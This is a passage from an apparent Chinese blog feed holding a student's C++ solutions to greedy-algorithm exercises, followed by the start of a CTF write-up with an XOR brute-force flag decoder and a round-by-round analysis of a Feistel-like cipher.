m[i<span class="number">-1</span>][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;m[n][h]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="贪心法"><a href="#贪心法" class="headerlink" title="贪心法"></a>贪心法</h2><p>这类题目记得先排序，按怎样的顺序排，自己看清题目</p><h3 id="homework"><a href="#homework" class="headerlink" title="homework"></a>homework</h3><h4 id="题目描述-11"><a href="#题目描述-11" class="headerlink" title="题目描述"></a>题目描述</h4><p>临近开学了，大家都忙着收拾行李准  备返校，但 I_Love_C 却不为此担心! 因为他的心思全在暑假作业上：目前为止还未开动。</p><p>暑假作业是很多张试卷，我们这些从试卷里爬出来的人都知道，卷子上的题目有选择题、填空题、简答题、证明题等。而做选择题的好处就在于工作量很少，但又因为选择题题目都普遍很长。如果有 5 张试卷，其中 4 张是选择题，最后一张是填空题，很明显做最后一张所花的时间要比前 4 张长很多。但如果你只做了选择题，虽然工作量很少，但表面上看起来也已经做了4/5的作业了。</p><p>I_Love_C决定就用这样的方法来蒙混过关，他统计出了做完每一张试卷所需的时间以及它做完后能得到的价值（按上面的原理，选择题越多价值当然就越高咯）。</p><p>现在就请你帮他安排一下，用他仅剩的一点时间来做最有价值的作业。</p><h5 id="输入-12"><a href="#输入-12" class="headerlink" title="输入"></a>输入</h5><p>测试数据包括多组。每组测试数据以两个整数 M,N(1&lt;M&lt;20,1&lt;N&lt;10000) 开头，分别表示试卷的数目和 I_Love_C 剩下的时间。接下来有 M 行，每行包括两个整数 T,V(1&lt;T&lt;N,1&lt;V&lt;10000)分别表示做完这张试卷所需的时间以及做完后能得到的价值，输入以 0 0 结束。</p><h5 id="输出-12"><a href="#输出-12" class="headerlink" title="输出"></a>输出</h5><p>对应每组测试数据输出 I_Love_C 能获得的最大价值。保留小数点 2 位</p><p>提示：float 的精度可能不够，你应该使用 double 类型。</p><h5 id="样例输入-12"><a href="#样例输入-12" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">4 20</span><br><span class="line">4 10</span><br><span class="line">5 22</span><br><span class="line">10 3</span><br><span class="line">1 2</span><br><span class="line">0 0</span><br></pre></td></tr></table></figure><h5 id="样例输出-12"><a href="#样例输出-12" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">37.00</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work</span>&#123;</span></span><br><span class="line"><span class="keyword">double</span> t,v;</span><br><span class="line"><span class="keyword">double</span> <span class="keyword">v_t</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(work a, work b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a.<span class="keyword">v_t</span> &gt; b.<span class="keyword">v_t</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> m,n;</span><br><span class="line">work w[<span class="number">105</span>];</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;m&gt;&gt;n &amp;&amp; (m!=<span class="number">0</span> &amp;&amp; n != <span class="number">0</span>))&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span> ; i&lt;m ;i++)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;w[i].t&gt;&gt;w[i].v;</span><br><span class="line">w[i].<span class="keyword">v_t</span> = w[i].v/w[i].t;</span><br><span class="line">&#125;</span><br><span class="line">sort(w,w+m,cmp);</span><br><span class="line"><span class="keyword">double</span> k =<span class="number">0</span>,<span class="keyword">p_t</span> =<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>; i&lt;m ;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">p_t</span> + w[i].t &lt;= n)&#123;</span><br><span class="line"><span class="keyword">p_t</span> += w[i].t;</span><br><span class="line">k += w[i].v;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">p_t</span> &lt; n)&#123;</span><br><span class="line">k += (n - <span class="keyword">p_t</span>)*w[i].<span class="keyword">v_t</span>;</span><br><span class="line"><span class="keyword">p_t</span> = n;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%.2lf"</span>,k);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="区间包含问题"><a href="#区间包含问题" class="headerlink" title="区间包含问题"></a>区间包含问题</h3><h4 id="题目描述-12"><a href="#题目描述-12" class="headerlink" title="题目描述"></a>题目描述</h4><p>已知 n 个左闭右开区间 [a,b)，对其进行 m 次询问，求区间[l,r]最多可以包含 n 个区间中的多少个区间，并且被包含的所有区间都不相交。</p><h5 id="输入-13"><a href="#输入-13" class="headerlink" title="输入"></a>输入</h5><p>输入包含多组测试数据，对于每组测试数据：</p><p>第一行包含两个整数 n ,m (1≤n≤100000,1≤m≤100) 。</p><p>接下来 n 行每行包含两个整数 a ,b (0≤ a&lt; b≤ 10^9) 。</p><p>接下来 m 行每行包含两个整数 l ,r (0≤ l&lt; r≤ 10^9)  。</p><h5 id="输出-13"><a href="#输出-13" class="headerlink" title="输出"></a>输出</h5><p>对于每组测试数据，输出 m 行，每行包含一个整数。</p><h5 id="样例输入-13"><a href="#样例输入-13" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">4 3</span><br><span class="line">1 3</span><br><span class="line">2 4</span><br><span class="line">1 4</span><br><span class="line">1 2</span><br><span class="line">1 2</span><br><span class="line">1 3</span><br><span class="line">1 4</span><br></pre></td></tr></table></figure><h5 id="样例输出-13"><a href="#样例输出-13" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">1</span><br><span class="line">2</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> s,e;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(node a,node b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span>  a.e &lt; b.e;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n ,m;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m;</span><br><span class="line">node a[<span class="number">105</span>],b[<span class="number">105</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt; n;i++)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a[i].s&gt;&gt;a[i].e;</span><br><span class="line">&#125;</span><br><span class="line">sort(a,a+n,cmp);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j&lt; m;j++)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;b[j].s&gt;&gt;b[j].e;</span><br><span class="line"><span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span> ;k &lt; n;k ++)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[k].s &gt;= b[j].s)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[k].e &lt;= b[j].e)&#123;</span><br><span class="line">sum++;</span><br><span class="line">b[j].s = a[k].e;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;sum&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="法师康的工人"><a href="#法师康的工人" class="headerlink" title="法师康的工人"></a>法师康的工人</h3><h4 id="题目描述-13"><a href="#题目描述-13" class="headerlink" title="题目描述"></a>题目描述</h4><p>三个法师康的工人每天早上6点到工厂开始到三条产品生产线上组装桔子手机。第一个工人在200时刻开始（从6点开始计时，以秒作为单位）在生产线上开始生产，一直到1000时刻。第二个工人，在700时刻开始，在1100时刻结束。第三个工人从1500时刻工作到2100时刻。期间最长至少有一个工人在生产线上工作的连续时间为900秒（从200时刻到1100时刻），而最长的无人生产的连续时间（从生产开始到生产结束）为400时刻（1100时刻到1500时刻）。</p><p>你的任务是用一个程序衡量N个工人在N条产品线上的工作时间列表（1≤N≤5000，以秒为单位）。</p><p>最长的至少有一个工人在工作的时间段</p><p>最长的无人工作的时间段（从有人工作开始计）</p><h5 id="输入-14"><a href="#输入-14" class="headerlink" title="输入"></a>输入</h5><p>输入第1行为一个整数N，第2-N+1行每行包括两个均小于1000000的非负整数数据，表示其中一个工人的生产开始时间与结束时间。</p><h5 id="输出-14"><a href="#输出-14" class="headerlink" title="输出"></a>输出</h5><p>输出为一行，用空格分隔开两个我们所求的数。</p><h5 id="样例输入-14"><a href="#样例输入-14" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">200 1000</span><br><span class="line">700 1100</span><br><span class="line">1500 2100</span><br></pre></td></tr></table></figure><h5 id="样例输出-14"><a href="#样例输出-14" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">900 400</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">worker</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> s,e;</span><br><span class="line">&#125;w[<span class="number">105</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(worker a, worker b)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(a.s == b.s) <span class="keyword">return</span> a.e&lt;b.e;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> a.s &lt; b.s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> N ;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;N;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>; i &lt; N ; i++) <span class="built_in">cin</span>&gt;&gt;w[i].s&gt;&gt;w[i].e;</span><br><span class="line"><span class="keyword">int</span> sus = w[<span class="number">0</span>].e -w[<span class="number">0</span>].s,gap = <span class="number">0</span>,t1 = w[<span class="number">0</span>].s,t2 = w[<span class="number">0</span>].e;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt; N ;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(w[i].s &gt; t2)&#123;</span><br><span class="line">gap = max(gap,w[i].s-t2);</span><br><span class="line">t1 = w[i].s;</span><br><span class="line">&#125;</span><br><span class="line">t2 = max(t2,w[i].e);</span><br><span class="line">sus = max(sus,t2-t1);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;sus&lt;&lt;<span class="string">" "</span>&lt;&lt;gap&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>  <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="哈夫曼编码"><a href="#哈夫曼编码" class="headerlink" title="哈夫曼编码"></a>哈夫曼编码</h3><h4 id="题目描述-14"><a href="#题目描述-14" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定一只含有小写字母的字符串；输出其哈夫曼编码的长度</p><h5 id="输入-15"><a href="#输入-15" class="headerlink" title="输入"></a>输入</h5><p>第一行一个整数T，代表样例的个数，接下来T行，每行一个字符串，0&lt;T&lt;=2000,字符串长度0&lt;L&lt;=1500.</p><h5 id="输出-15"><a href="#输出-15" class="headerlink" title="输出"></a>输出</h5><p>对于每个字符串，输出其哈夫曼编码长度</p><h5 id="样例输入-15"><a href="#样例输入-15" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">hrvsh</span><br><span class="line">lcxeasexdphiopd</span><br><span class="line">mntflolfbtbpplahqolqykrqdnwdoq</span><br></pre></td></tr></table></figure><h5 id="样例输出-15"><a href="#样例输出-15" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10</span><br><span class="line">51</span><br><span class="line">115</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> b[<span class="number">30</span>];</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">1005</span>];</span><br><span class="line"><span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cmp</span>&#123;</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> x&gt;y;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*会用优先队列事半功倍*/</span></span><br><span class="line">priority_queue&lt;<span class="keyword">int</span> , <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;,cmp&gt; q;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ;i&lt;<span class="number">26</span>;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(b[i]) q.push(b[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(q.size()&gt;<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">int</span> a  = q.top();</span><br><span class="line">q.pop();</span><br><span class="line"><span class="keyword">int</span> c = q.top();</span><br><span class="line">q.pop();</span><br><span class="line">sum = a+c;</span><br><span class="line">q.push(sum);</span><br><span class="line"></span><br><span class="line">ans += sum ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>,ans);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> T;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;T;</span><br><span class="line"><span class="keyword">while</span>(T--)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;s;</span><br><span class="line"><span class="keyword">int</span> lens =<span class="built_in">strlen</span>(s);</span><br><span class="line"><span class="keyword">while</span>(!q.empty()) q.pop();</span><br><span class="line">ans = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">memset</span>(b,<span class="number">0</span>,<span class="keyword">sizeof</span>(b));</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>; i &lt; lens ; i++)&#123;</span><br><span class="line">b[<span class="keyword">int</span>(s[i]-<span class="string">'a'</span>)]++;</span><br><span class="line">&#125; </span><br><span class="line">solve();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="活动安排-考试考了类似的"><a href="#活动安排-考试考了类似的" class="headerlink" title="活动安排(考试考了类似的)"></a>活动安排(考试考了类似的)</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> begin,end;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(work a,work b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a.end &lt; b.end;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">work w[<span class="number">50</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>; i&lt; n; i++)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;w[i].begin&gt;&gt;w[i].end;</span><br><span class="line">&#125;</span><br><span class="line">sort(w,w+n,cmp);</span><br><span class="line"><span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">1</span>; i&lt; n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(w[i].begin &gt;= w[j].end)&#123;</span><br><span class="line">ans++;</span><br><span class="line">j = i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近要上机考试，因此还是对以前做过的题目做一个复习回顾，自己重新手写一遍，纯属回顾，代码风格不好请海涵，考完试以后我把考了的点都标记了一下方便以后学弟学妹们复习了
    
    </summary>
    
      <category term="算法" scheme="0verwatch.top/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="algorithm" scheme="0verwatch.top/tags/algorithm/"/>
    
  </entry>
  
  <entry>
    <title>护网杯部分题目题解</title>
    <link href="0verwatch.top/huwang-game.html"/>
    <id>0verwatch.top/huwang-game.html</id>
    <published>2018-10-13T16:27:10.000Z</published>
    <updated>2018-10-14T01:52:10.852Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>护网杯的这次比赛还是很有收获的，至少在web方面我认为是这样<a id="more"></a>的。。。</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="迟来的签到"><a href="#迟来的签到" class="headerlink" title="迟来的签到"></a>迟来的签到</h4><p><code>AAoHAR1UIFBSJFFQU1AjUVEjVidWUVJVJVZUIyUnI18jVFNXVRs=</code><br>题目说要异或，那就直接爆破异或就好<br>写个小脚本就可以得到flag<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"> </span><br><span class="line">a = <span class="string">"AAoHAR1UIFBSJFFQU1AjUVEjVidWUVJVJVZUIyUnI18jVFNXVRs="</span></span><br><span class="line">a = base64.b64decode(a)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">128</span>):</span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> a:</span><br><span class="line">s  = s+chr(i^ord(j))</span><br><span class="line"><span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> s:</span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure></p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="fez"><a href="#fez" class="headerlink" title="fez"></a>fez</h4><p>这个题目是我队友做的。。。。赛后才学习的，看来密码学以后还得认真上课。。。。<br>Fez.log给出三条数据，第一条为test，第二条为test与k加密后的数据，第三条为flag与k加密后的数据<br>fez.py为加密算法，通过分析算法</p><p><img src="https://s1.ax1x.com/2018/10/13/iUC4te.jpg" alt="iUC4te.jpg"></p><p>即a，b每一位进行异或运算<br><img src="https://s1.ax1x.com/2018/10/13/iUCHXt.jpg" alt="iUCHXt.jpg"><br>Round函数将M左右部分互换，并对右部分进行异或运算得 <code>R^L^k[i]</code><br>Fez函数即将k数组每个元素与m进行<code>round</code>运算<br>可得m为字符串分为<code>m[0:27]</code>,<code>m[27:54]</code>两部分通过一步一步推算<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">m:  L + R</span><br><span class="line">R + a    a: L^R^k0</span><br><span class="line">a + b    b: L^k0^k1</span><br><span class="line">b +    c    c: R^k0^k1    </span><br><span class="line">c + d    d: L^k0^k2^k3</span><br><span class="line">d + e    e: L^k0^k1^k3^k4</span><br><span class="line">e + f    f: R^k1^k2^k4^k5</span><br><span class="line">f + g    g: 